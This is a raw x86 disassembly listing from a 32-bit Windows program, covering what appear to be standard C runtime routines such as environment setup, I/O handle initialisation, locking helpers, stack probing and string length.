  424e00:	call   0x426072
  424e05:	mov    edi,eax
  424e07:	add    esp,0xc
  424e0a:	test   edi,edi
  424e0c:	jne    0x424e13
  424e0e:	or     eax,0xffffffff
  424e11:	jmp    0x424e38
  424e13:	lea    eax,[ebp-0x4]
  424e16:	push   eax
  424e17:	lea    ecx,[esi+edi*1]
  424e1a:	push   edi
  424e1b:	lea    esi,[ebp-0x8]
  424e1e:	mov    eax,ebx
  424e20:	call   0x424c2f
  424e25:	mov    eax,DWORD PTR [ebp-0x4]
  424e28:	dec    eax
  424e29:	pop    ecx
  424e2a:	mov    ds:0x45dad8,eax
  424e2f:	pop    ecx
  424e30:	mov    DWORD PTR ds:0x45dadc,edi
  424e36:	xor    eax,eax
  424e38:	pop    edi
  424e39:	pop    esi
  424e3a:	pop    ebx
  424e3b:	leave  
  424e3c:	ret    
  424e3d:	push   ecx
  424e3e:	push   ecx
  424e3f:	mov    eax,ds:0x45dc18
  424e44:	push   ebx
  424e45:	push   ebp
  424e46:	push   esi
  424e47:	push   edi
  424e48:	mov    edi,DWORD PTR ds:0x429084
  424e4e:	xor    ebx,ebx
  424e50:	xor    esi,esi
  424e52:	cmp    eax,ebx
  424e54:	push   0x2
  424e56:	pop    ebp
  424e57:	jne    0x424e86
  424e59:	call   edi
  424e5b:	mov    esi,eax
  424e5d:	cmp    esi,ebx
  424e5f:	je     0x424e6d
  424e61:	mov    DWORD PTR ds:0x45dc18,0x1
  424e6b:	jmp    0x424e8b
  424e6d:	call   DWORD PTR ds:0x429028
  424e73:	cmp    eax,0x78
  424e76:	jne    0x424e81
  424e78:	mov    eax,ebp
  424e7a:	mov    ds:0x45dc18,eax
  424e7f:	jmp    0x424e86
  424e81:	mov    eax,ds:0x45dc18
  424e86:	cmp    eax,0x1
  424e89:	jne    0x424f08
  424e8b:	cmp    esi,ebx
  424e8d:	jne    0x424e97
  424e8f:	call   edi
  424e91:	mov    esi,eax
  424e93:	cmp    esi,ebx
  424e95:	je     0x424f10
  424e97:	cmp    WORD PTR [esi],bx
  424e9a:	mov    eax,esi
  424e9c:	je     0x424eac
  424e9e:	add    eax,ebp
  424ea0:	cmp    WORD PTR [eax],bx
  424ea3:	jne    0x424e9e
  424ea5:	add    eax,ebp
  424ea7:	cmp    WORD PTR [eax],bx
  424eaa:	jne    0x424e9e
  424eac:	mov    edi,DWORD PTR ds:0x429080
  424eb2:	push   ebx
  424eb3:	push   ebx
  424eb4:	push   ebx
  424eb5:	sub    eax,esi
  424eb7:	push   ebx
  424eb8:	sar    eax,1
  424eba:	inc    eax
  424ebb:	push   eax
  424ebc:	push   esi
  424ebd:	push   ebx
  424ebe:	push   ebx
  424ebf:	mov    DWORD PTR [esp+0x34],eax
  424ec3:	call   edi
  424ec5:	mov    ebp,eax
  424ec7:	cmp    ebp,ebx
  424ec9:	je     0x424efd
  424ecb:	push   ebp
  424ecc:	call   0x426072
  424ed1:	cmp    eax,ebx
  424ed3:	pop    ecx
  424ed4:	mov    DWORD PTR [esp+0x10],eax
  424ed8:	je     0x424efd
  424eda:	push   ebx
  424edb:	push   ebx
  424edc:	push   ebp
  424edd:	push   eax
  424ede:	push   DWORD PTR [esp+0x24]
  424ee2:	push   esi
  424ee3:	push   ebx
  424ee4:	push   ebx
  424ee5:	call   edi
  424ee7:	test   eax,eax
  424ee9:	jne    0x424ef9
  424eeb:	push   DWORD PTR [esp+0x10]
  424eef:	call   0x425f5a
  424ef4:	pop    ecx
  424ef5:	mov    DWORD PTR [esp+0x10],ebx
  424ef9:	mov    ebx,DWORD PTR [esp+0x10]
  424efd:	push   esi
  424efe:	call   DWORD PTR ds:0x42907c
  424f04:	mov    eax,ebx
  424f06:	jmp    0x424f58
  424f08:	cmp    eax,ebp
  424f0a:	je     0x424f14
  424f0c:	cmp    eax,ebx
  424f0e:	je     0x424f14
  424f10:	xor    eax,eax
  424f12:	jmp    0x424f58
  424f14:	call   DWORD PTR ds:0x429078
  424f1a:	mov    esi,eax
  424f1c:	cmp    esi,ebx
  424f1e:	je     0x424f10
  424f20:	cmp    BYTE PTR [esi],bl
  424f22:	je     0x424f2e
  424f24:	inc    eax
  424f25:	cmp    BYTE PTR [eax],bl
  424f27:	jne    0x424f24
  424f29:	inc    eax
  424f2a:	cmp    BYTE PTR [eax],bl
  424f2c:	jne    0x424f24
  424f2e:	sub    eax,esi
  424f30:	inc    eax
  424f31:	mov    ebp,eax
  424f33:	push   ebp
  424f34:	call   0x426072
  424f39:	mov    edi,eax
  424f3b:	cmp    edi,ebx
  424f3d:	pop    ecx
  424f3e:	jne    0x424f44
  424f40:	xor    edi,edi
  424f42:	jmp    0x424f4f
  424f44:	push   ebp
  424f45:	push   esi
  424f46:	push   edi
  424f47:	call   0x426090
  424f4c:	add    esp,0xc
  424f4f:	push   esi
  424f50:	call   DWORD PTR ds:0x429074
  424f56:	mov    eax,edi
  424f58:	pop    edi
  424f59:	pop    esi
  424f5a:	pop    ebp
  424f5b:	pop    ebx
  424f5c:	pop    ecx
  424f5d:	pop    ecx
  424f5e:	ret    
  424f5f:	sub    esp,0x48
  424f62:	push   ebx
  424f63:	mov    ebx,0x480
  424f68:	push   ebx
  424f69:	call   0x426072
  424f6e:	test   eax,eax
  424f70:	pop    ecx
  424f71:	jne    0x424f7b
  424f73:	or     eax,0xffffffff
  424f76:	jmp    0x425158
  424f7b:	mov    ds:0x45e160,eax
  424f80:	mov    DWORD PTR ds:0x45e148,0x20
  424f8a:	lea    ecx,[eax+0x480]
  424f90:	jmp    0x424fb0
  424f92:	and    BYTE PTR [eax+0x4],0x0
  424f96:	or     DWORD PTR [eax],0xffffffff
  424f99:	and    DWORD PTR [eax+0x8],0x0
  424f9d:	mov    BYTE PTR [eax+0x5],0xa
  424fa1:	mov    ecx,DWORD PTR ds:0x45e160
  424fa7:	add    eax,0x24
  424faa:	add    ecx,0x480
  424fb0:	cmp    eax,ecx
  424fb2:	jb     0x424f92
  424fb4:	push   ebp
  424fb5:	push   esi
  424fb6:	push   edi
  424fb7:	lea    eax,[esp+0x14]
  424fbb:	push   eax
  424fbc:	call   DWORD PTR ds:0x429050
  424fc2:	cmp    WORD PTR [esp+0x46],0x0
  424fc8:	je     0x4250b7
  424fce:	mov    eax,DWORD PTR [esp+0x48]
  424fd2:	test   eax,eax
  424fd4:	je     0x4250b7
  424fda:	mov    edi,DWORD PTR [eax]
  424fdc:	lea    ebp,[eax+0x4]
  424fdf:	lea    eax,[edi+ebp*1]
  424fe2:	mov    DWORD PTR [esp+0x10],eax
  424fe6:	mov    eax,0x800
  424feb:	cmp    edi,eax
  424fed:	jl     0x424ff1
  424fef:	mov    edi,eax
  424ff1:	cmp    DWORD PTR ds:0x45e148,edi
  424ff7:	jge    0x425047
  424ff9:	mov    esi,0x45e164
  424ffe:	push   ebx
  424fff:	call   0x426072
  425004:	test   eax,eax
  425006:	pop    ecx
  425007:	je     0x425041
  425009:	add    DWORD PTR ds:0x45e148,0x20
  425010:	mov    DWORD PTR [esi],eax
  425012:	lea    ecx,[eax+0x480]
  425018:	jmp    0x425030
  42501a:	and    BYTE PTR [eax+0x4],0x0
  42501e:	or     DWORD PTR [eax],0xffffffff
  425021:	and    DWORD PTR [eax+0x8],0x0
  425025:	mov    BYTE PTR [eax+0x5],0xa
  425029:	mov    ecx,DWORD PTR [esi]
  42502b:	add    eax,0x24
  42502e:	add    ecx,ebx
  425030:	cmp    eax,ecx
  425032:	jb     0x42501a
  425034:	add    esi,0x4
  425037:	cmp    DWORD PTR ds:0x45e148,edi
  42503d:	jl     0x424ffe
  42503f:	jmp    0x425047
  425041:	mov    edi,DWORD PTR ds:0x45e148
  425047:	xor    ebx,ebx
  425049:	test   edi,edi
  42504b:	jle    0x4250b7
  42504d:	mov    eax,DWORD PTR [esp+0x10]
  425051:	mov    eax,DWORD PTR [eax]
  425053:	cmp    eax,0xffffffff
  425056:	je     0x4250ac
  425058:	mov    cl,BYTE PTR [ebp+0x0]
  42505b:	test   cl,0x1
  42505e:	je     0x4250ac
  425060:	test   cl,0x8
  425063:	jne    0x425070
  425065:	push   eax
  425066:	call   DWORD PTR ds:0x42908c
  42506c:	test   eax,eax
  42506e:	je     0x4250ac
  425070:	mov    ecx,ebx
  425072:	mov    eax,ebx
  425074:	and    eax,0x1f
  425077:	lea    eax,[eax+eax*8]
  42507a:	sar    ecx,0x5
  42507d:	mov    ecx,DWORD PTR [ecx*4+0x45e160]
  425084:	lea    esi,[ecx+eax*4]
  425087:	mov    eax,DWORD PTR [esp+0x10]
  42508b:	mov    eax,DWORD PTR [eax]
  42508d:	mov    DWORD PTR [esi],eax
  42508f:	mov    al,BYTE PTR [ebp+0x0]
  425092:	mov    BYTE PTR [esi+0x4],al
  425095:	lea    eax,[esi+0xc]
  425098:	push   0xfa0
  42509d:	push   eax
  42509e:	call   0x4263dd
  4250a3:	test   eax,eax
  4250a5:	pop    ecx
  4250a6:	pop    ecx
  4250a7:	je     0x4250d7
  4250a9:	inc    DWORD PTR [esi+0x8]
  4250ac:	add    DWORD PTR [esp+0x10],0x4
  4250b1:	inc    ebx
  4250b2:	inc    ebp
  4250b3:	cmp    ebx,edi
  4250b5:	jl     0x42504d
  4250b7:	xor    ebx,ebx
  4250b9:	mov    ecx,DWORD PTR ds:0x45e160
  4250bf:	lea    eax,[ebx+ebx*8]
  4250c2:	lea    esi,[ecx+eax*4]
  4250c5:	cmp    DWORD PTR [esi],0xffffffff
  4250c8:	jne    0x425139
  4250ca:	test   ebx,ebx
  4250cc:	mov    BYTE PTR [esi+0x4],0x81
  4250d0:	jne    0x4250dc
  4250d2:	push   0xfffffff6
  4250d4:	pop    eax
  4250d5:	jmp    0x4250e6
  4250d7:	or     eax,0xffffffff
  4250da:	jmp    0x425155
  4250dc:	mov    eax,ebx
  4250de:	dec    eax
  4250df:	neg    eax
  4250e1:	sbb    eax,eax
  4250e3:	add    eax,0xfffffff5
  4250e6:	push   eax
  4250e7:	call   DWORD PTR ds:0x429068
  4250ed:	mov    edi,eax
  4250ef:	cmp    edi,0xffffffff
  4250f2:	je     0x425133
  4250f4:	push   edi
  4250f5:	call   DWORD PTR ds:0x42908c
  4250fb:	test   eax,eax
  4250fd:	je     0x425133
  4250ff:	and    eax,0xff
  425104:	cmp    eax,0x2
  425107:	mov    DWORD PTR [esi],edi
  425109:	jne    0x425111
  42510b:	or     BYTE PTR [esi+0x4],0x40
  42510f:	jmp    0x42511a
  425111:	cmp    eax,0x3
  425114:	jne    0x42511a
  425116:	or     BYTE PTR [esi+0x4],0x8
  42511a:	lea    eax,[esi+0xc]
  42511d:	push   0xfa0
  425122:	push   eax
  425123:	call   0x4263dd
  425128:	test   eax,eax
  42512a:	pop    ecx
  42512b:	pop    ecx
  42512c:	je     0x4250d7
  42512e:	inc    DWORD PTR [esi+0x8]
  425131:	jmp    0x42513d
  425133:	or     BYTE PTR [esi+0x4],0x40
  425137:	jmp    0x42513d
  425139:	or     BYTE PTR [esi+0x4],0x80
  42513d:	inc    ebx
  42513e:	cmp    ebx,0x3
  425141:	jl     0x4250b9
  425147:	push   DWORD PTR ds:0x45e148
  42514d:	call   DWORD PTR ds:0x429088
  425153:	xor    eax,eax
  425155:	pop    edi
  425156:	pop    esi
  425157:	pop    ebp
  425158:	pop    ebx
  425159:	add    esp,0x48
  42515c:	ret    
  42515d:	push   0xc
  42515f:	push   0x4295b8
  425164:	call   0x425350
  425169:	mov    DWORD PTR [ebp-0x1c],0x42a010
  425170:	cmp    DWORD PTR [ebp-0x1c],0x42a010
  425177:	jae    0x42519b
  425179:	and    DWORD PTR [ebp-0x4],0x0
  42517d:	mov    eax,DWORD PTR [ebp-0x1c]
  425180:	mov    eax,DWORD PTR [eax]
  425182:	test   eax,eax
  425184:	je     0x425191
  425186:	call   eax
  425188:	jmp    0x425191
  42518a:	xor    eax,eax
  42518c:	inc    eax
  42518d:	ret    
  42518e:	mov    esp,DWORD PTR [ebp-0x18]
  425191:	or     DWORD PTR [ebp-0x4],0xffffffff
  425195:	add    DWORD PTR [ebp-0x1c],0x4
  425199:	jmp    0x425170
  42519b:	call   0x42538b
  4251a0:	ret    
  4251a1:	push   0xc
  4251a3:	push   0x4295c8
  4251a8:	call   0x425350
  4251ad:	mov    DWORD PTR [ebp-0x1c],0x42a018
  4251b4:	cmp    DWORD PTR [ebp-0x1c],0x42a018
  4251bb:	jae    0x4251df
  4251bd:	and    DWORD PTR [ebp-0x4],0x0
  4251c1:	mov    eax,DWORD PTR [ebp-0x1c]
  4251c4:	mov    eax,DWORD PTR [eax]
  4251c6:	test   eax,eax
  4251c8:	je     0x4251d5
  4251ca:	call   eax
  4251cc:	jmp    0x4251d5
  4251ce:	xor    eax,eax
  4251d0:	inc    eax
  4251d1:	ret    
  4251d2:	mov    esp,DWORD PTR [ebp-0x18]
  4251d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4251d9:	add    DWORD PTR [ebp-0x1c],0x4
  4251dd:	jmp    0x4251b4
  4251df:	call   0x42538b
  4251e4:	ret    
  4251e5:	call   0x425426
  4251ea:	mov    eax,ds:0x45d304
  4251ef:	cmp    eax,0xffffffff
  4251f2:	je     0x425202
  4251f4:	push   eax
  4251f5:	call   DWORD PTR ds:0x429094
  4251fb:	or     DWORD PTR ds:0x45d304,0xffffffff
  425202:	ret    
  425203:	push   ebx
  425204:	push   esi
  425205:	call   DWORD PTR ds:0x429028
  42520b:	push   DWORD PTR ds:0x45d304
  425211:	mov    ebx,eax
  425213:	call   DWORD PTR ds:0x4290a4
  425219:	mov    esi,eax
  42521b:	test   esi,esi
  42521d:	jne    0x425268
  42521f:	push   0x88
  425224:	push   0x1
  425226:	call   0x426468
  42522b:	mov    esi,eax
  42522d:	test   esi,esi
  42522f:	pop    ecx
  425230:	pop    ecx
  425231:	je     0x425260
  425233:	push   esi
  425234:	push   DWORD PTR ds:0x45d304
  42523a:	call   DWORD PTR ds:0x4290a0
  425240:	test   eax,eax
  425242:	je     0x425260
  425244:	mov    DWORD PTR [esi+0x54],0x45d258
  42524b:	mov    DWORD PTR [esi+0x14],0x1
  425252:	call   DWORD PTR ds:0x42909c
  425258:	or     DWORD PTR [esi+0x4],0xffffffff
  42525c:	mov    DWORD PTR [esi],eax
  42525e:	jmp    0x425268
  425260:	push   0x10
  425262:	call   0x424416
  425267:	pop    ecx
  425268:	push   ebx
  425269:	call   DWORD PTR ds:0x429098
  42526f:	mov    eax,esi
  425271:	pop    esi
  425272:	pop    ebx
  425273:	ret    
  425274:	call   0x4253dd
  425279:	test   eax,eax
  42527b:	je     0x42528d
  42527d:	call   DWORD PTR ds:0x4290a8
  425283:	cmp    eax,0xffffffff
  425286:	mov    ds:0x45d304,eax
  42528b:	jne    0x425295
  42528d:	call   0x4251e5
  425292:	xor    eax,eax
  425294:	ret    
  425295:	push   esi
  425296:	push   0x88
  42529b:	push   0x1
  42529d:	call   0x426468
  4252a2:	mov    esi,eax
  4252a4:	test   esi,esi
  4252a6:	pop    ecx
  4252a7:	pop    ecx
  4252a8:	je     0x4252da
  4252aa:	push   esi
  4252ab:	push   DWORD PTR ds:0x45d304
  4252b1:	call   DWORD PTR ds:0x4290a0
  4252b7:	test   eax,eax
  4252b9:	je     0x4252da
  4252bb:	mov    DWORD PTR [esi+0x54],0x45d258
  4252c2:	mov    DWORD PTR [esi+0x14],0x1
  4252c9:	call   DWORD PTR ds:0x42909c
  4252cf:	or     DWORD PTR [esi+0x4],0xffffffff
  4252d3:	mov    DWORD PTR [esi],eax
  4252d5:	xor    eax,eax
  4252d7:	inc    eax
  4252d8:	pop    esi
  4252d9:	ret    
  4252da:	call   0x4251e5
  4252df:	xor    eax,eax
  4252e1:	pop    esi
  4252e2:	ret    
  4252e3:	cmp    DWORD PTR ds:0x45dac4,0x2
  4252ea:	jne    0x4252f9
  4252ec:	cmp    DWORD PTR ds:0x45dad0,0x5
  4252f3:	jb     0x4252f9
  4252f5:	xor    eax,eax
  4252f7:	inc    eax
  4252f8:	ret    
  4252f9:	push   0x3
  4252fb:	pop    eax
  4252fc:	ret    
  4252fd:	xor    eax,eax
  4252ff:	cmp    DWORD PTR [esp+0x4],eax
  425303:	push   0x0
  425305:	sete   al
  425308:	push   0x1000
  42530d:	push   eax
  42530e:	call   DWORD PTR ds:0x429034
  425314:	test   eax,eax
  425316:	mov    ds:0x45e140,eax
  42531b:	je     0x425347
  42531d:	call   0x4252e3
  425322:	cmp    eax,0x3
  425325:	mov    ds:0x45e144,eax
  42532a:	jne    0x42534a
  42532c:	push   0x3f8
  425331:	call   0x4266ea
  425336:	test   eax,eax
  425338:	pop    ecx
  425339:	jne    0x42534a
  42533b:	push   DWORD PTR ds:0x45e140
  425341:	call   DWORD PTR ds:0x4290ac
  425347:	xor    eax,eax
  425349:	ret    
  42534a:	xor    eax,eax
  42534c:	inc    eax
  42534d:	ret    
  42534e:	int3   
  42534f:	int3   
  425350:	push   0x427218
  425355:	mov    eax,fs:0x0
  42535b:	push   eax
  42535c:	mov    eax,DWORD PTR [esp+0x10]
  425360:	mov    DWORD PTR [esp+0x10],ebp
  425364:	lea    ebp,[esp+0x10]
  425368:	sub    esp,eax
  42536a:	push   ebx
  42536b:	push   esi
  42536c:	push   edi
  42536d:	mov    eax,DWORD PTR [ebp-0x8]
  425370:	mov    DWORD PTR [ebp-0x18],esp
  425373:	push   eax
  425374:	mov    eax,DWORD PTR [ebp-0x4]
  425377:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42537e:	mov    DWORD PTR [ebp-0x8],eax
  425381:	lea    eax,[ebp-0x10]
  425384:	mov    fs:0x0,eax
  42538a:	ret    
  42538b:	mov    ecx,DWORD PTR [ebp-0x10]
  42538e:	mov    DWORD PTR fs:0x0,ecx
  425395:	pop    ecx
  425396:	pop    edi
  425397:	pop    esi
  425398:	pop    ebx
  425399:	leave  
  42539a:	push   ecx
  42539b:	ret    
  42539c:	int3   
  42539d:	int3   
  42539e:	int3   
  42539f:	int3   
  4253a0:	cmp    eax,0x1000
  4253a5:	jae    0x4253b5
  4253a7:	neg    eax
  4253a9:	add    eax,esp
  4253ab:	add    eax,0x4
  4253ae:	test   DWORD PTR [eax],eax
  4253b0:	xchg   esp,eax
  4253b1:	mov    eax,DWORD PTR [eax]
  4253b3:	push   eax
  4253b4:	ret    
  4253b5:	push   ecx
  4253b6:	lea    ecx,[esp+0x8]
  4253ba:	sub    ecx,0x1000
  4253c0:	sub    eax,0x1000
  4253c5:	test   DWORD PTR [ecx],eax
  4253c7:	cmp    eax,0x1000
  4253cc:	jae    0x4253ba
  4253ce:	sub    ecx,eax
  4253d0:	mov    eax,esp
  4253d2:	test   DWORD PTR [ecx],eax
  4253d4:	mov    esp,ecx
  4253d6:	mov    ecx,DWORD PTR [eax]
  4253d8:	mov    eax,DWORD PTR [eax+0x4]
  4253db:	push   eax
  4253dc:	ret    
  4253dd:	push   esi
  4253de:	push   edi
  4253df:	xor    esi,esi
  4253e1:	mov    edi,0x45dc20
  4253e6:	cmp    DWORD PTR [esi*8+0x45d314],0x1
  4253ee:	jne    0x42540e
  4253f0:	lea    eax,[esi*8+0x45d310]
  4253f7:	mov    DWORD PTR [eax],edi
  4253f9:	push   0xfa0
  4253fe:	push   DWORD PTR [eax]
  425400:	add    edi,0x18
  425403:	call   0x4263dd
  425408:	test   eax,eax
  42540a:	pop    ecx
  42540b:	pop    ecx
  42540c:	je     0x42541a
  42540e:	inc    esi
  42540f:	cmp    esi,0x24
  425412:	jl     0x4253e6
  425414:	xor    eax,eax
  425416:	inc    eax
  425417:	pop    edi
  425418:	pop    esi
  425419:	ret    
  42541a:	and    DWORD PTR [esi*8+0x45d310],0x0
  425422:	xor    eax,eax
  425424:	jmp    0x425417
  425426:	push   ebx
  425427:	mov    ebx,DWORD PTR ds:0x429090
  42542d:	push   esi
  42542e:	mov    esi,0x45d310
  425433:	push   edi
  425434:	mov    edi,DWORD PTR [esi]
  425436:	test   edi,edi
  425438:	je     0x42544d
  42543a:	cmp    DWORD PTR [esi+0x4],0x1
  42543e:	je     0x42544d
  425440:	push   edi
  425441:	call   ebx
  425443:	push   edi
  425444:	call   0x425f5a
  425449:	and    DWORD PTR [esi],0x0
  42544c:	pop    ecx
  42544d:	add    esi,0x8
  425450:	cmp    esi,0x45d430
  425456:	jl     0x425434
  425458:	mov    esi,0x45d310
  42545d:	pop    edi
  42545e:	mov    eax,DWORD PTR [esi]
  425460:	test   eax,eax
  425462:	je     0x42546d
  425464:	cmp    DWORD PTR [esi+0x4],0x1
  425468:	jne    0x42546d
  42546a:	push   eax
  42546b:	call   ebx
  42546d:	add    esi,0x8
  425470:	cmp    esi,0x45d430
  425476:	jl     0x42545e
  425478:	pop    esi
  425479:	pop    ebx
  42547a:	ret    
  42547b:	push   ebp
  42547c:	mov    ebp,esp
  42547e:	mov    eax,DWORD PTR [ebp+0x8]
  425481:	push   DWORD PTR [eax*8+0x45d310]
  425488:	call   DWORD PTR ds:0x4290b4
  42548e:	pop    ebp
  42548f:	ret    
  425490:	push   ebp
  425491:	mov    ebp,esp
  425493:	push   esi
  425494:	mov    esi,DWORD PTR [ebp+0x8]
  425497:	lea    esi,[esi*8+0x45d310]
  42549e:	cmp    DWORD PTR [esi],0x0
  4254a1:	je     0x4254a8
  4254a3:	xor    eax,eax
  4254a5:	inc    eax
  4254a6:	jmp    0x42550c
  4254a8:	push   edi
  4254a9:	push   0x18
  4254ab:	call   0x426072
  4254b0:	mov    edi,eax
  4254b2:	test   edi,edi
  4254b4:	pop    ecx
  4254b5:	jne    0x4254c6
  4254b7:	call   0x4272f0
  4254bc:	mov    DWORD PTR [eax],0xc
  4254c2:	xor    eax,eax
  4254c4:	jmp    0x42550b
  4254c6:	push   0xa
  4254c8:	call   0x42550f
  4254cd:	cmp    DWORD PTR [esi],0x0
  4254d0:	pop    ecx
  4254d1:	jne    0x4254f9
  4254d3:	push   0xfa0
  4254d8:	push   edi
  4254d9:	call   0x4263dd
  4254de:	test   eax,eax
  4254e0:	pop    ecx
  4254e1:	pop    ecx
  4254e2:	jne    0x4254f5
  4254e4:	push   edi
  4254e5:	call   0x425f5a
  4254ea:	push   0xa
  4254ec:	call   0x42547b
  4254f1:	pop    ecx
  4254f2:	pop    ecx
  4254f3:	jmp    0x4254b7
  4254f5:	mov    DWORD PTR [esi],edi
  4254f7:	jmp    0x425500
  4254f9:	push   edi
  4254fa:	call   0x425f5a
  4254ff:	pop    ecx
  425500:	push   0xa
  425502:	call   0x42547b
  425507:	xor    eax,eax
  425509:	pop    ecx
  42550a:	inc    eax
  42550b:	pop    edi
  42550c:	pop    esi
  42550d:	pop    ebp
  42550e:	ret    
  42550f:	push   ebp
  425510:	mov    ebp,esp
  425512:	mov    eax,DWORD PTR [ebp+0x8]
  425515:	push   esi
  425516:	lea    esi,[eax*8+0x45d310]
  42551d:	cmp    DWORD PTR [esi],0x0
  425520:	jne    0x425535
  425522:	push   eax
  425523:	call   0x425490
  425528:	test   eax,eax
  42552a:	pop    ecx
  42552b:	jne    0x425535
  42552d:	push   0x11
  42552f:	call   0x424416
  425534:	pop    ecx
  425535:	push   DWORD PTR [esi]
  425537:	call   DWORD PTR ds:0x4290b8
  42553d:	pop    esi
  42553e:	pop    ebp
  42553f:	ret    
  425540:	push   esi
  425541:	push   DWORD PTR ds:0x45e268
  425547:	call   0x4274a6
  42554c:	pop    ecx
  42554d:	mov    ecx,DWORD PTR ds:0x45e264
  425553:	mov    esi,eax
  425555:	mov    eax,ds:0x45e268
  42555a:	mov    edx,ecx
  42555c:	sub    edx,eax
  42555e:	add    edx,0x4
  425561:	cmp    esi,edx
  425563:	jae    0x4255b3
  425565:	mov    ecx,0x800
  42556a:	cmp    esi,ecx
  42556c:	jae    0x425570
  42556e:	mov    ecx,esi
  425570:	add    ecx,esi
  425572:	push   ecx
  425573:	push   eax
  425574:	call   0x4272f9
  425579:	test   eax,eax
  42557b:	pop    ecx
  42557c:	pop    ecx
  42557d:	jne    0x425596
  42557f:	add    esi,0x10
  425582:	push   esi
  425583:	push   DWORD PTR ds:0x45e268
  425589:	call   0x4272f9
  42558e:	test   eax,eax
  425590:	pop    ecx
  425591:	pop    ecx
  425592:	jne    0x425596
  425594:	pop    esi
  425595:	ret    
  425596:	mov    ecx,DWORD PTR ds:0x45e264
  42559c:	sub    ecx,DWORD PTR ds:0x45e268
  4255a2:	mov    ds:0x45e268,eax
  4255a7:	sar    ecx,0x2
  4255aa:	lea    ecx,[eax+ecx*4]
  4255ad:	mov    DWORD PTR ds:0x45e264,ecx
  4255b3:	mov    DWORD PTR [ecx],edi
  4255b5:	add    DWORD PTR ds:0x45e264,0x4
  4255bc:	mov    eax,edi
  4255be:	pop    esi
  4255bf:	ret    
  4255c0:	push   0x80
  4255c5:	call   0x426072
  4255ca:	test   eax,eax
  4255cc:	pop    ecx
  4255cd:	mov    ds:0x45e268,eax
  4255d2:	jne    0x4255d8
  4255d4:	push   0x18
  4255d6:	pop    eax
  4255d7:	ret    
  4255d8:	and    DWORD PTR [eax],0x0
  4255db:	mov    eax,ds:0x45e268
  4255e0:	mov    ds:0x45e264,eax
  4255e5:	xor    eax,eax
  4255e7:	ret    
  4255e8:	push   0xc
  4255ea:	push   0x4295d8
  4255ef:	call   0x425350
  4255f4:	call   0x424661
  4255f9:	and    DWORD PTR [ebp-0x4],0x0
  4255fd:	mov    edi,DWORD PTR [ebp+0x8]
  425600:	call   0x425540
  425605:	mov    DWORD PTR [ebp-0x1c],eax
  425608:	or     DWORD PTR [ebp-0x4],0xffffffff
  42560c:	call   0x42561a
  425611:	mov    eax,DWORD PTR [ebp-0x1c]
  425614:	call   0x42538b
  425619:	ret    
  42561a:	call   0x42466a
  42561f:	ret    
  425620:	push   DWORD PTR [esp+0x4]
  425624:	call   0x4255e8
  425629:	neg    eax
  42562b:	sbb    eax,eax
  42562d:	neg    eax
  42562f:	pop    ecx
  425630:	dec    eax
  425631:	ret    
  425632:	push   ebp
  425633:	mov    ebp,esp
  425635:	sub    esp,0x10
  425638:	push   ebx
  425639:	xor    ebx,ebx
  42563b:	cmp    DWORD PTR ds:0x45dd70,ebx
  425641:	push   esi
  425642:	push   edi
  425643:	jne    0x4256b2
  425645:	push   0x429648
  42564a:	call   DWORD PTR ds:0x4290bc
  425650:	mov    edi,eax
  425652:	cmp    edi,ebx
  425654:	je     0x4256ed
  42565a:	mov    esi,DWORD PTR ds:0x429020
  425660:	push   0x42963c
  425665:	push   edi
  425666:	call   esi
  425668:	test   eax,eax
  42566a:	mov    ds:0x45dd70,eax
  42566f:	je     0x4256ed
  425671:	push   0x42962c
  425676:	push   edi
  425677:	call   esi
  425679:	push   0x429618
  42567e:	push   edi
  42567f:	mov    ds:0x45dd74,eax
  425684:	call   esi
  425686:	cmp    DWORD PTR ds:0x45dac4,0x2
  42568d:	mov    ds:0x45dd78,eax
  425692:	jne    0x4256b2
  425694:	push   0x4295fc
  425699:	push   edi
  42569a:	call   esi
  42569c:	test   eax,eax
  42569e:	mov    ds:0x45dd80,eax
  4256a3:	je     0x4256b2
  4256a5:	push   0x4295e4
  4256aa:	push   edi
  4256ab:	call   esi
  4256ad:	mov    ds:0x45dd7c,eax
  4256b2:	mov    eax,ds:0x45dd7c
  4256b7:	test   eax,eax
  4256b9:	je     0x4256f7
  4256bb:	call   eax
  4256bd:	test   eax,eax
  4256bf:	je     0x4256de
  4256c1:	lea    ecx,[ebp-0x4]
  4256c4:	push   ecx
  4256c5:	push   0xc
  4256c7:	lea    ecx,[ebp-0x10]
  4256ca:	push   ecx
  4256cb:	push   0x1
  4256cd:	push   eax
  4256ce:	call   DWORD PTR ds:0x45dd80
  4256d4:	test   eax,eax
  4256d6:	je     0x4256de
  4256d8:	test   BYTE PTR [ebp-0x8],0x1
  4256dc:	jne    0x4256f7
  4256de:	cmp    DWORD PTR ds:0x45dad0,0x4
  4256e5:	jb     0x4256f1
  4256e7:	or     BYTE PTR [ebp+0x12],0x20
  4256eb:	jmp    0x425716
  4256ed:	xor    eax,eax
  4256ef:	jmp    0x425726
  4256f1:	or     BYTE PTR [ebp+0x12],0x4
  4256f5:	jmp    0x425716
  4256f7:	mov    eax,ds:0x45dd74
  4256fc:	test   eax,eax
  4256fe:	je     0x425716
  425700:	call   eax
  425702:	mov    ebx,eax
  425704:	test   ebx,ebx
  425706:	je     0x425716
  425708:	mov    eax,ds:0x45dd78
  42570d:	test   eax,eax
  42570f:	je     0x425716
  425711:	push   ebx
  425712:	call   eax
  425714:	mov    ebx,eax
  425716:	push   DWORD PTR [ebp+0x10]
  425719:	push   DWORD PTR [ebp+0xc]
  42571c:	push   DWORD PTR [ebp+0x8]
  42571f:	push   ebx
  425720:	call   DWORD PTR ds:0x45dd70
  425726:	pop    edi
  425727:	pop    esi
  425728:	pop    ebx
  425729:	leave  
  42572a:	ret    
  42572b:	int3   
  42572c:	int3   
  42572d:	int3   
  42572e:	int3   
  42572f:	int3   
  425730:	push   edi
  425731:	mov    edi,DWORD PTR [esp+0x8]
  425735:	jmp    0x4257a5
  425737:	lea    esp,[esp+0x0]
  42573e:	mov    edi,edi
  425740:	mov    ecx,DWORD PTR [esp+0x4]
  425744:	push   edi
  425745:	test   ecx,0x3
  42574b:	je     0x425760
  42574d:	mov    al,BYTE PTR [ecx]
  42574f:	add    ecx,0x1
  425752:	test   al,al
  425754:	je     0x425793
  425756:	test   ecx,0x3
  42575c:	jne    0x42574d
  42575e:	mov    edi,edi
  425760:	mov    eax,DWORD PTR [ecx]
  425762:	mov    edx,0x7efefeff
  425767:	add    edx,eax
  425769:	xor    eax,0xffffffff
  42576c:	xor    eax,edx
  42576e:	add    ecx,0x4
  425771:	test   eax,0x81010100
  425776:	je     0x425760
